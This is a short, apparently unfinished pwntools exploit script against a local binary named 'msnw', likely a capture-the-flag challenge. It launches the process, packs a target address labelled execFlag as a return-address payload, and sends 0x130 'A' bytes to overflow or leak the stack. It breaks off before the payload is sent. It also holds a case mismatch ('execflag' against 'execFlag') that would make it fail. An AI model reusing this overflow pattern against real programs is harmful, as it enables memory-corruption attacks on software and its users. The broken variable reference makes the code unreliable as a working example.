from pwn import *

p=process("./msnw")

execFlag=0x40135b
payload=p64(execflag)

p.sendafter(b':', b'A'*0x130)
p.recvuntil(b'A'*0x130)


